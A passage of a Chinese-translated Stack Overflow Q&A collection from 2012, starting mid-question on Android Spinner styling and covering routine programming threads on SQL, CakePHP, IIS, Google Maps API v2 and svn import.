<style name="appcin" parent="@android:style/Theme.NoTitleBar.Fullscreen">
    <item name="android:spinnerStyle">@style/spinnerStyle</item>
    <item name="android:spinnerItemStyle">@style/SpinnerItem</item>
    <item name="android:spinnerDropDownItemStyle">@style/SpinnerDropDownItem</item> -->
    <item name="android:background">#FFFFFF</item>
</style>
<style name="spinnerStyle">
    <item name="android:background">@drawable/pink_white_dropdown</item>
    <item name="android:clickable">true</item>
</style>
<style name="SpinnerItem">
    <item name="android:textColor">#993399</item>
    <item name="android:background">@drawable/pink_white_dropdown</item>
    <item name="android:maxHeight">10dip</item>
</style>
<style name="SpinnerDropDownItem">
    <item name="android:textColor">#993399</item>
    <item name="android:background">#FFFFFF</item>
</style> 
```

我已经尝试将它添加到应用程序主题中，但它们都没有任何区别，背景仍然是白色的。

```
<...theme....>
   <item name="android:dropDownListViewStyle">@style/DropDownStyle</item>
   <item name="android:dropDownSpinnerStyle">@style/DropDownStyle</item>
   <item name="android:dropDownSelector">@style/DropDownStyle</item>
</... theme ...>
<style name="DropDownStyle">
    <item name="android:background">#FFF000</item>
    <item name="android:popupBackground">#FFF000</item>
    <item name="android:cacheColorHint">#FFF000</item>
</style> 
```

在 drawable/pink_white_dropdown 中，只为所有情况显示相同的图像。pink_white_arrow 是我制作的 9patch 图像。有很多指南，[这是我在 30sec 在 google 上找到的](http://www.android10.org/index.php/articlesother/279-draw-9-patch-tutorial)。

```
<selector xmlns:android="http://schemas.android.com/apk/res/android">
  <item android:state_window_focused="false" android:state_enabled="true"
      android:drawable="@drawable/pink_white_arrow"/>
  <item android:state_window_focused="false" android:state_enabled="false"
      android:drawable="@drawable/pink_white_arrow"/>
  <item android:state_pressed="true" 
      android:drawable="@drawable/pink_white_arrow"/>
  <item android:state_pressed="false" 
      android:drawable="@drawable/pink_white_arrow"/>
  <item android:state_focused="true" android:state_enabled="true" 
      android:drawable="@drawable/pink_white_arrow"/>
  <item android:state_enabled="true" 
      android:drawable="@drawable/pink_white_arrow"/>
  <item android:state_focused="true" 
      android:drawable="@drawable/pink_white_arrow"/>
  <item 
      android:drawable="@drawable/pink_white_arrow"/>
</selector> 
```

在这些文件的某个地方，我认为应该使某些内容透明，但我不知道在哪里。

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-12-16T14:42:24.913

删除`SpinnerStyle`背景属性。

删除这个：

```
<style name="spinnerStyle">
    <item name="android:background">@drawable/whitish_rectangle</item>
</style> 
```

这就是绘制背景白色矩形的原因。

在您问题中的代码的基础上，这里有一个关于如何设置 Spinner 样式的基本示例：

该`styles.xml`文件为`SpinnerItem`and设置样式`SpinnerDropDownItem`：

```
<resources>
    <style name="customtheme" parent="@android:style/Theme.Light">
        <item name="android:spinnerItemStyle">@style/SpinnerItem</item>
        <item name="android:spinnerDropDownItemStyle">@style/SpinnerDropDownItem</item>
    </style>
    <style name="SpinnerItem">
        <item name="android:textColor">#993399</item>
        <item name="android:background">@drawable/my_rectangle</item>
    </style>
    <style name="SpinnerDropDownItem">
        <item name="android:textColor">#993399</item>
        <item name="android:background">@drawable/my_rectangle</item>
    </style>
</resources> 
```

为了测试，我创建了一个颜色鲜艳的可绘制形状，称为`my_rectangle.xml`. 将其替换为您自己的可绘制对象：

```
<?xml version="1.0" encoding="UTF-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android" >
    <solid android:color="#ff0000" />
    <stroke
        android:width="1dp"
        android:color="#888888" />
</shape> 
```

添加`Spinner`到`Activity's`布局：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent" 
    android:padding="40dip">
    <Spinner
        android:id="@+id/edit_countrySpinner"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:entries="@array/location_names"/>
</LinearLayout> 
```

这会产生：

![在此处输入图像描述](../Images/75a2a80478e02fbf75ffa85d824eb9ed.png)

背景中没有白色方块。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-06T07:40:26.400

添加

```
<item name="android:popupBackground">@null</item> 
```

到您的微调器样式。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-04-20T16:47:23.890

[样式 android 微调器](https://i.stack.imgur.com/dPCTy.png)

Spinner Widget 需要两种不同的自定义布局，一种用于显示视图，另一种用于下拉列表！

在这个关于自定义微调器 Android 的示例博客中，我们将指导您如何在 android studio 中创建一个自定义微调器，它将具有：

1.  选定项目的自定义背景
2.  自定义选定项目文本颜色
3.  下拉菜单的文本颜色
4.  下拉列表的背景
5.  微调器动画

链接在这里：[https ://androiddvlpr.com/custom-spinner-android/](https://androiddvlpr.com/custom-spinner-android/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-06T22:44:46.330

我遇到了同样的问题，下面的代码对我有用：

```
<item name="android:popupBackground">@null</item> 
```

# rest - 带有 REST API 的 PDF 存储系统

> ID：13703235
> 
> 赞同：1
> 
> 时间：2012-12-04T12:45:24.340
> 
> 标签：rest, pdf, storage

我有数十万个 PDF，目前存储在文件系统中。我有一个自定义应用程序，作为对其实际目的的事后考虑，它提供了对这些 PDF 的访问。我想从自定义应用程序中取出“存储和检索”部分，并使用开源文档存储后端。

应该通过 REST API 访问 PDF 商店，这样用户就不需要自定义客户端来进行基本的文档浏览和查看。存储 PDF 的程序也应该能够通过 REST API 工作。他们将提供实际的二进制或 ASCII 数据以及结构化元数据，这些元数据以后可用于检索。

一个典型的检索查询是“给我所有在 X 天和 Y 天之间创建的文档类型为 A 或 B 的文档”。

我的研究，是否存在这样的存储后端，结果是空的。你们中有人知道提供这些功能的系统吗？考虑了开源首选、价格合理的系统。

我不是在寻找关于如何使用可用技术“自己动手”的建议。相反，我试图找出是否可以避免这种情况。提前谢谢了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T23:43:39.910

您所描述的听起来像是一个文档管理或资产管理系统，其中有很多；许多人使用 PDF 文件。我对 Xinet（http://www.northplains.com/xinet - 现在显然已收购）或 Elvis (http://www.elvisdam.com) 等商业产品有一些短暂的经验。两者都可能符合您的要求，但它们可能太大而且可能太贵。

你看过Alfresco吗？这是我多年前在担任遴选委员会董事会时接触到的开源替代方案。据我记得，它肯定会朝着您正在寻找的方向发展，并且它是开源的，因此也可能适合这个角度：[http](http://www.alfresco.com) ://www.alfresco.com 。

# sql-server-2008-r2 - 从 Oracle 迁移到 SQL Server 后的校验和验证

> ID：13703237
> 
> 赞同：2
> 
> 时间：2012-12-04T12:45:28.857
> 
> 标签：sql-server-2008-r2, oracle11g, checksum, data-migration

我正在使用 SSIS 将大型数据库从 oracle 11g 迁移到 SQL SERVER 2008R2。如何使用校验和验证数字数据的数据完整性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-11T07:09:57.723

过去，我总是使用一些应用程序控件来完成此操作。它应该是在两个平台上都易于计算的东西。

通常，最终结果是如下查询：

```
select count(*)
,      count(distinct col1) col1_dist_cnt
...
,      count(distinct col99) col99_dist_cnt
,      sum(col1) col1_sum
...
,      sum(col99) col99_sum
from   table 
```

假脱机到文件、Excel 或数据库并比较结果。为项目管理和审计员节省费用。

[请在此处](http://www.invantive.com/about-invantive/news/entryid/872/application-controls-for-optimum-system-integrity)阅读有关应用程序控制的更多信息。我写它是为了检查各种财务报告系统之间的监管报告，所以这种方法适用于大多数情况。

如果只有一个字段值错误，它总是会显示出来。两个错误可能会相互补偿。例如，第 1 行第 1 行从第 2 行第 1 行获取值。

要检测这一点，请将每个值与该行的唯一值相乘。例如，如果您有一个唯一的 ID 列或身份也包含在迁移中：

```
,      sum(ID * col1) col1_sum
...
,      sum(ID * col99) col99_sum 
```

当您遇到数字溢出时，首先尝试使用最大的可用精度（尤其是在 SQL Server 上有时很难）。如果不再可行，请使用 mod 功能。mod只隐藏少数类型的错误。

锦上添花是自动生成这些语句。在 Oracle 上查看 user_tables、user_tab_columns。在 SQL Server 上查看 syscolumns 等。

# asp.net - 配置 IIS 以在同一域下上传多个网站

> ID：13703238
> 
> 赞同：0
> 
> 时间：2012-12-04T12:45:30.233
> 
> 标签：asp.net, iis, deployment, iis-7, asp-classic

我在 IIS 7 中上传了经典的 asp 项目，ApplicationPool 设置为 .Net framework 2.0。现在我已经为此开发了管理站点，但它在 asp.net 3.5 中。所以我想将此应用程序插入到这个经典的 asp 项目中，即部署。IE

老经典asp有网址

```
http://192.168.1.159:8888/profile/ 
```

现在我的管理站点将反映到

```
http://192.168.1.159:8888/profile/admin/ 
```

但是当我尝试查看浏览器并且无法加载时，我遇到了一些错误。我该如何配置它或我必须在 IIS 7 中进行哪些设置才能正常工作？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:00:17.893

您需要将`/admin`文件夹配置为新应用程序。

1.  打开 IIS 管理器
2.  展开您的计算机节点
3.  展开站点节点
4.  展开您想要这个新应用程序的站点
5.  右键单击`/admin`文件夹
6.  选择转换为应用程序
7.  填写别名框并勾选物理路径框
8.  单击确定，您就完成了。

有关步骤 6 后打开的对话框的图片，请参见[此处](https://support.gearhost.com/KB/a460/add-virtual-directory-as-application-in-iis-7.aspx)。

# cakephp - CakePHP - 如果是 INSERT 或 UPDATE，如何检查 beforeSave

> ID：13703246
> 
> 赞同：19
> 
> 时间：2012-12-04T12:46:15.630
> 
> 标签：cakephp, cakephp-2.0

在我的模型`beforeSave`方法中，如何检查保存操作是插入还是更新？

我想添加到模型数据中，但前提是它要插入新行。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-12-04T14:33:52.963

如果存在，您可以只签入数据`id`：

```
function beforeSave($options = array())
{
  if(empty($this->data[$this->alias]['id']))
  {
    //INSERT
  }
  else
  {
    //UPDATE
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-01-27T17:06:40.023

这就是你在 Cakephp 4 中的做法（以防有人在寻找它）

**编辑**它也适用于BadHorsie所说的Cakephp 3

```
public function beforeSave(EventInterface $event, EntityInterface $entity, ArrayObject $options)
{
    if ($entity->isNew()) {
       //INSERT
    }else{
       //UPDATE
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-05-24T11:26:51.480

你可以试试这个

```
public function beforeSave($options = array()) {

    if($this->id) {
        // Update
    } else {
        // Add
    }
} 
```

# bash - 对话框 - 一行文字

> ID：13703249
> 
> 赞同：0
> 
> 时间：2012-12-04T12:46:21.440
> 
> 标签：bash

如何自动显示一行文本？示例是两行，我需要 1 行...比你 ![在此处输入图像描述](../Images/2da848a5aa16e4721be86700dea2ada2.png)

我试过 --cr-wrap 和 --no-collapse [dialog(1) - Linux 手册页](http://linux.die.net/man/1/dialog)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:05:15.853

也许你必须指定更大的窗口：

```
dialog  --yesno 'Hello, this is my first dialog program' 20 60 
```

您可以使用`$COLUMN`and`$LINES`对应的尺寸：

```
dialog  --yesno 'Hello, this is my first dialog program' $((LINES-4)) $((COLUMNS-4)) 
```

甚至用于在 bash 脚本中调整窗口大小：

```
trap 'COLUMNS=`tput cols` LINES=`tput lines`' WINCH 
```

# sql - How to write this SQL statement correctly?

> ID：13703254
> 
> 赞同：1
> 
> 时间：2012-12-04T12:46:40.780
> 
> 标签：sql, join, informix

As written in the title: How to write this SQL statement correctly?

```
 select 
    sl.switch_ip,
    sl.switch_name, 
    count(m.switch_ip) as macentries,
    (select arpentries from (select sl1.switch_ip, sl1.switch_name, count(ar.switch_ip) as arpentries 
        from my_switchlist sl1 
        left Join my_arptable ar on ar.switch_ip = sl1.switch_ip
        group by sl1.switch_ip,sl1.switch_name 
        order by sl1.switch_ip))
    from my_switchlist sl 
        left Join my_mactable m on m.switch_ip = sl.switch_ip
    group by sl.switch_ip,sl.switch_name 
    order by sl.switch_ip 
```

The select and the sub-select work fine if they are executed separately. But as soon as I put them together I get the following error:

```
Error: A subquery has returned not exactly one row.
SQLState: 21000
ErrorCode: -284
Position: 470 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T12:53:45.760

您的“my_switchlist，my_arptable”加入中可能有多个“sl1.switch_ip，sl1.switch_name”组。

```
select arpentries from (select sl1.switch_ip, sl1.switch_name, count(ar.switch_ip) as arpentries 
        from my_switchlist sl1 
        left Join my_arptable ar on ar.switch_ip = sl1.switch_ip
        group by sl1.switch_ip,sl1.switch_name 
        order by sl1.switch_ip) 
```

上述查询不应返回多个结果，以便您在外部查询中使用其结果。所以可能有不止一个“sl1.switch_ip,sl1.switch_name”组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:59:48.277

看起来您想要两个“计数”聚合，这应该可以通过以下方式实现：

```
select
   macquery.switch_ip,
   macquery.switch_name,
   macquery.macentries,
   arpquery.arpentries
from
(
   select 
      sl.switch_ip as switch_ip,
      sl.switch_name as switch_name,  
      count(m.switch_ip) as macentries
   from my_switchlist sl 
   left outer join my_mactable m
   on m.switch_ip = sl.switch_ip
   group by
      sl.switch_ip,
      sl.switch_name 
) macquery

join

(
   select
      sl1.switch_ip as switch_ip,
      sl1.switch_name as switch_name,
      count(ar.switch_ip) as arpentries 
   from my_switchlist sl1 
   left outer join my_arptable ar
   on ar.switch_ip = sl1.switch_ip
   group by
      sl1.switch_ip,
      sl1.switch_name 
) arpquery

on  (macquery.switch_ip =  arpquery.switch_ip
    and  macquery.switch_name =  arpquery.switch_name) 
```

# android - Signed App cant install on low end tablet

> ID：13703259
> 
> 赞同：1
> 
> 时间：2012-12-04T12:47:02.027
> 
> 标签：android, eclipse, google-maps, google-places-api, self-signed

Hi guys, I know most of people faced the problem same like me. But I still cant solve this problems. I had build android app and this app is using Google Map API and Google Places API. I had signed my apk file using Eclipse wizard, but when I transfer it to my tab (taiwan product) using SD Card it said "application not installed". I never installed this app with debug key before. All others Google Map apps I downloaded from Play store can use well in this tab. I set min android version is 2.2 and highest is 4.0.3\. My tab running on 4.0.3. I also tried to install this app to other brands low end tablet, and it was successful. But in my tablet, it failed. Anybody have idea why I can't install this signed apk file? I had tried so much to solve this. thanks..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T12:51:26.020

在每个 Android 用户的生活中，都有一段时间您想要安装在 Android Market 中找不到的应用程序。如果这是您第一次尝试安装，则会收到“为了安全起见，您的手机已设置为阻止安装不是从 Android Market 获得的应用程序”的消息。但是我们如何到达那里？

要允许从非电子市场应用程序安装应用程序，请点击主屏幕上的菜单按钮，然后选择设置 >> 应用程序 >> 未知来源。

这些“未知来源”是谁，他们想要什么？简而言之，它是 Android Market 以外的任何东西。可能是通过电子邮件发送的应用程序。或者从网站下载。

如果您担心允许未知来源的安全隐患，有一个简单的解决方法 - 从 Android Market 外部安装应用程序，然后再次点击复选框将其关闭。

[来源](http://www.androidcentral.com/allow-app-installs-unknown-sources)。

# integration - AddThis integration

> ID：13703260
> 
> 赞同：2
> 
> 时间：2012-12-04T12:47:05.730
> 
> 标签：integration, this, umbraco, add, addthis

Hi y'all great developers,

I am trying to integrate AddThis into Umbraco CMS and would like to hear if any of you know how to add it via an IFrame or the like so that a client would be able to see the statistics in the backoffice.

Any suggestions on auto log-in are also welcomed!

Thanks a lot for your help. Kind regards, Iulia

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T09:23:22.360

将 iframe 添加到 ascx 或 aspx 文件中没有问题。因此，无论哪个是首选的，都有一些很好的步骤来自定义 umbraco 后台以显示自定义 aspx 页面或 ascx 控件。

向 umbraco 管理后台添加一个新部分的文档很好。 [如果您完成这些步骤，您可以在后台拥有自己的部分](http://www.geckonewmedia.com/blog/2009/8/3/how-to-create-a-custom-section-in-umbraco-4)- 然后只需创建一个或多个包含您想要显示的内容的 aspx 页面。

或者，您可以[更改或添加选项卡到后台的标准视图，](http://www.softwareassociates.in/blog/how-to-customize-umbraco-dashboard/)然后使用 ascx 用户控件来显示您喜欢的任何内容。

# php - solution to a select in a many to many relationship

> ID：13703261
> 
> 赞同：0
> 
> 时间：2012-12-04T12:47:05.707
> 
> 标签：php, mysql, sql

i have the following tables: where one project may have many categories and one category may have many projects...

```
**project**
proj_id pk
proj_name 
proj_descr
proj_what_we_did
proj_url
proj_descr_url

**project_per_categories**
project_proj_id pk
category_cat_id pk

**category**
cat_id pk
cat_name 
```

and the following select:

```
SELECT proj_name, proj_descr, 
proj_what_we_did, proj_url, 
proj_descr_url, cat_name,  foto_url
FROM   project p, project_per_categories pc,
category c, foto f
WHERE  p.proj_id = pc.project_proj_id AND
pc.category_cat_id = c.cat_id AND
p.proj_id = f.foto_id
ORDER BY p.proj_id DESC
LIMIT 6 
```

that is bringing the following result in var_dump:

```
 array (size=2)
   0 => 
     array (size=7)
       'proj_name' => string 'Rockable Magazine' (length=17)
       'proj_descr' => string 'Id nihil consectetur facilis assumenda minimau'(length=329)
       'proj_what_wi_did' => string 'Web Design' (length=10)
       'proj_url' => string 'http://localhost/datacode/projeto' (length=33)
       'proj_descr_url' => string 'Rockable-Magazine' (length=17)
       'cat_name' => string 'web design' (length=10)
       'foto_url' => string 'localhost/datacode/portfolio/case_study.jpg' (length=43)
   1 => 
     array (size=7)
       'proj_name' => string 'Rockable Magazine' (length=17)
       'proj_descr' => string 'Id nihil consectetur facilis assumenda minimau'(length=329)
       'proj_what_we_did' => string 'Web Design' (length=10)
       'proj_url' => string 'http://localhost/datacode/projeto' (length=33)
       'proj_descr_url' => string 'Rockable-Magazine' (length=17)
       'cat_name' => string 'css' (length=3)
       'foto_url' => string 'localhost/datacode/portfolio/case_study.jpg' (length=43) 
```

now i will ask, note that only the cat_name have diferent values, so how can i implode or aggregate this two or more values in the cat_name field separated by commas ?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:54:08.777

查看[group_concat](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html#function_group-concat)函数。像这样的东西应该适合你：

```
SELECT 
  proj_name, 
  proj_descr, 
  proj_what_we_did, 
  proj_url, 
  proj_descr_url, 
  group_concat(cat_name),  
  foto_url
FROM   project p, 
  project_per_categories pc,
  category c, 
  foto f
WHERE  p.proj_id = pc.project_proj_id 
  AND pc.category_cat_id = c.cat_id 
  AND p.proj_id = f.foto_id
GROUP BY p.proj_id
ORDER BY p.proj_id DESC
LIMIT 6 
```

# mysql - how to inverse a mysql query?

> ID：13703266
> 
> 赞同：1
> 
> 时间：2012-12-04T12:47:17.830
> 
> 标签：mysql

Would anyone know how to inverse the following mysql query?

```
select * 
from test_results 
where TESTERID='3' 
  and TESTID IN (select TESTID 
                 from tests 
                 where TESTSREQUESTED > '0' 
                   AND TESTSREQUESTED > TESTSREQUESTEDTAKEN); 
```

Thanks!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:49:33.230

```
select * from test_results where not (TESTERID='3' and TESTID IN (select TESTID from tests where TESTSREQUESTED>'0' AND TESTSREQUESTED>TESTSREQUESTEDTAKEN)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:02:16.287

尝试这个：：

```
select
 * 
from test_results tr
INNER JOIN tests  on (tests.TESTID=tr.TESTID)

where tr.TESTERID!='3' 
OR (tests.TESTERID!='3' AND tests.TESTSREQUESTED<'0' AND TESTSREQUESTED<TESTSREQUESTEDTAKEN) 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-04T12:49:10.190

尝试这个

```
select * from test_results where TESTERID!='3' and TESTID NOT IN (select TESTID from tests where TESTSREQUESTED>'0' AND TESTSREQUESTED>TESTSREQUESTEDTAKEN) 
```

# asp.net - How to implement SASS in an asp.net project

> ID：13703269
> 
> 赞同：1
> 
> 时间：2012-12-04T12:47:21.940
> 
> 标签：asp.net, css, sass

I am searching for a solution on how to implement SASS into an asp.net project. I have searched a lot but have found no example on the web. As far as I know some kind of JavaScript file will be needed in project in order for it to work.

Can anybody please share a sample aspx page with one or two textboxes with SASS applied to it?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:10:15.153

Sass 是用 Ruby 编写的，而不是 JavaScript。有一些 JS 编译器，但没有一个是官方的，也不应该*考虑*在开发之外使用它们。

在 Ruby on Rails 之外，没有*集成*. 您将源文件放在适当的位置并使用 Sass 编译器对其进行编译并将 CSS 文件放入您的公共目录。是使用命令行还是像 Scout 这样的应用程序取决于您。

我个人在处理 Sass 文件时会使用命令行持续观察它们，编译只需一两秒（仅比使用 alt-tab 稍长一些，因此我可以刷新并查看它的外观） .

# android - Google map API v2 is not working

> ID：13703273
> 
> 赞同：7
> 
> 时间：2012-12-04T12:47:29.747
> 
> 标签：android, maps, google-maps-android-api-2

I am trying to run sample code mention here : [Google Maps Android API V2 Sample code](https://developers.google.com/maps/documentation/android/intro#sample_code)

but i am getting error NoClassDefFound. Below is my logcat.

Can any one help me to solve it. Any help is highly appricated Thanks

```
12-04 18:04:18.854: E/AndroidRuntime(1801): java.lang.ExceptionInInitializerError
12-04 18:04:18.854: E/AndroidRuntime(1801):     at java.lang.Class.newInstanceImpl(Native Method)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at java.lang.Class.newInstance(Class.java:1319)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at android.app.Instrumentation.newActivity(Instrumentation.java:1053)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1974)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2084)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at android.app.ActivityThread.access$600(ActivityThread.java:130)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1195)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at android.os.Handler.dispatchMessage(Handler.java:99)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at android.os.Looper.loop(Looper.java:137)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at android.app.ActivityThread.main(ActivityThread.java:4745)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at java.lang.reflect.Method.invokeNative(Native Method)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at java.lang.reflect.Method.invoke(Method.java:511)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
12-04 18:04:18.854: E/AndroidRuntime(1801):     at dalvik.system.NativeStart.main(Native Method)
12-04 18:04:18.854: E/AndroidRuntime(1801): Caused by: java.lang.NoClassDefFoundError: com.example.mapdemo.BasicMapActivity
12-04 18:04:18.854: E/AndroidRuntime(1801):     at com.example.mapdemo.MainActivity.<clinit>(MainActivity.java:98)
12-04 18:04:18.854: E/AndroidRuntime(1801):     ... 15 more 
```

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-12-04T15:17:29.970

我有同样的问题，并通过执行以下操作得到解决，

*   删除您手动添加的 android-support-v4.jar
*   右键单击项目并选择 Android 工具 -> 添加支持库 ...

在此之后，一切都对我有用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-11T18:37:00.957

这对我有用。

导入 Android-Support-V4.jar 和 Google_Play_Services_lib.jar 后，转到：

**项目属性 > Java 构建路径 > 排序和导出。**

然后确保选中 Android-Support-V4.jar 和 Google_Play_Services_lib.jar 旁边的复选框。

单击确定，然后运行。一切都应该很好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-11-13T09:30:45.943

android-support-v4.jar的多重引用

这对我有用。
如果您的项目和 goolge 播放服务库项目都包含 android-support-v4.jar 则它会发生冲突。
从任何一个项目中删除 android-support-v4.jar。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-19T16:16:52.427

跟进 NewUserSOF 的回答（我是新手）：

我实现了 Jairo 的回答，Google Maps V2“MainActivity”运行并显示了选项列表。

但是现在当我点击其中任何一个时，我的模拟器说我需要更新 Google Play 服务。当我点击“更新”按钮时，应用程序崩溃了。

来自 LogCat：

12-19 16:02:44.902：W/GooglePlayServicesUtil(2431)：Google Play 服务已过期。需要 2012100 但找到 1015

12-19 16:02:51.136: E/AndroidRuntime(2431): android.content.ActivityNotFoundException: 找不到活动来处理 Intent { act=android.intent.action.VIEW dat=http://play.google.com/商店/应用程序/详细信息？id=com.google.android.gms flg=0x80000 pkg=com.android.vending }

有没有办法在模拟器上更新 Google Play 服务。（模拟器是运行 Google API 的 Nexus S 17）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T12:51:30.637

听起来你错过了一些重要的东西；）你做了这些步骤吗？

*   选择 Project > Properties，选择 Java Build Path，然后导航到 Libraries。
*   选择 Add External Jars，包括以下 jar 文件，然后单击 OK：

/extras/android/compatibility/v4/android-support-v4.jar

*   添加您自己的 Google Maps Android API 密钥。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-04T14:05:21.900

编辑：Jairo 的回答对我有用。Edit2：它运行但没有显示地图。我有 API 密钥。是刚拿到手的新品。使用的包名 com.example.mapdemo。Edit3：刷新 API 密钥（它们不会持续很长时间）。仍然没有显示地图。Edit4：使用错误的密钥库导致错误的 SHA1。当我搜索它时，搜索没有在 .android 文件夹中找到它（ubuntu 没有搜索隐藏文件夹），而是显示了我从下载 android 源代码中获得的密钥库。

我有完全相同的错误。

MainActivity 启动，指的是同一个包中的 BasicMapActivity。BasicMapActivity 扩展了 android-support-v4.jar 中的 FragmentActivity。

在此页面上：[https](https://developers.google.com/maps/documentation/android/intro) ://developers.google.com/maps/documentation/android/intro 请参阅第 4 步：“选择添加外部 jar，包括以下 jar 文件，然后单击确定：/extras/android/compatibility/v4/ android-support-v4.jar"

我的 jar 路径是 /support/ 而不是 /compatibility/ - 我没有 /compatibility/ 文件夹。也许这是一个线索？

我的 android-support-v4.jar 的修改日期为 Mon 19 Nov 2012 09:14:47 AM EST。让我想知道我是否错过了最新的更新。SDK Manager 已运行并重新运行。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-01-17T00:59:56.587

对我来说，问题是没有安装谷歌地图。我擦了我的平板电脑，忘了重新安装它。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-05T00:17:49.667

根据您的源设置方式，您可能需要设置要导出的 android-support-library（右键单击-> 属性-> java 构建路径-> 顺序和导出）此外，您需要使用 SupportMapFragment 而不是支持库的 MapFragment。确保您还使用 getSupportFragmentManager 而不是 getFragmentManager。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-12-04T17:00:11.403

1) 验证 Eclipse 用于签署您的应用程序的调试密钥库实际上是您提取 SHA1 哈希以生成 api 密钥的那个

去：

> Window > Android > Build > "Default debug keystore" 并将路径复制到 keystore

跑

> keytool -list -v -keystore YOUR_KEYSTORE_PATH -alias androiddebugkey

2) 验证你在API控制台配置中SHA1哈希后输入了你应用的包

> Android 应用程序：XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX;com.yourapp.package

3) 我在测试开始时遇到了这个错误，我记得 Logcat 上记录了一个错误。诸如“身份验证错误”或“API 密钥错误”之类的东西。只需在应用程序的第一次运行时注意 logcat，以检查您的 API 密钥没有问题。如果您遇到此错误，您将不得不终止/重新安装该应用程序。在应用程序仍在运行时修复 api 密钥并不能完全解决问题。

4) 我必须将支持 jar 添加到示例应用程序内的 libs 文件夹中。在 Eclipse 构建路径中将其链接为外部 jar 对我不起作用。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-12-04T13:38:24.490

Google Play 服务库项目是否作为 Sampleproject 中的库项目引用？

# svn - 如何将项目添加到 svn 服务器？

> ID：13703280
> 
> 赞同：4
> 
> 时间：2012-12-04T12:47:54.023
> 
> 标签：svn, visualsvn-server

我必须向 SVN 服务器存储库添加一个项目，如果能获得一些链接或有关如何执行此操作的一些帮助，我将不胜感激。

SVN 存储库的 URL 是`https://192.168.1.4:448/svn/BDRAsigViata/`. 该项目位于桌面上。路径是`/Users/name/Desktop` ，项目名称是*BDRAsigurariViata v1.0.zip*。

我试图以这种方式添加项目

```
 svn import /Users/name/Desktop/BDRAsigurariViata v1.0.zip  https://192.168.1.4:448/svn/BDRAsigViata 
```

但它不起作用。为了能够做到这一点，我是否也应该遵循其他步骤？

我得到错误：

> ```
>  svn: E205000: Try 'svn help' for more info
>    svn: E205000: Too many arguments to import command 
> ```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-05T08:44:11.097

**[繁琐模式开启]**您是否尝试将 ZIP 存档添加到*版本控制*存储库？Apache Subversion 是一个 *版本控制*系统，而不是简单的文件存储或 Dropbox！它旨在存储和管理您的代码。由于您使用术语“项目”，我假设您只是压缩了源代码文件并希望将它们作为存档提交。这不是它的工作原理。**[繁琐模式关闭]**

不过，您需要的命令是

```
svn import "C:\Users\name\Desktop\BCRAsigurariViata v1.0.zip" "https://192.168.1.4:448/svn/BCRAsigViata/BCRAsigurariViata v1.0.zip" -m "Commit Message" 
```

由于您是 Apache Subversion 和 VisualSVN Server 的新手，您绝对应该留出一些时间来阅读[SVNBook](http://www.visualsvn.com/support/svnbook/)。强烈建议 Apache Subversion 新手使用这些介绍性主题：

*   [什么是颠覆？](http://svnbook.red-bean.com/en/1.8/svn.intro.whatis.html)
*   [基础概念](http://svnbook.red-bean.com/en/1.8/svn.basic.html)
*   [基本用法](http://svnbook.red-bean.com/en/1.8/svn.tour.html)

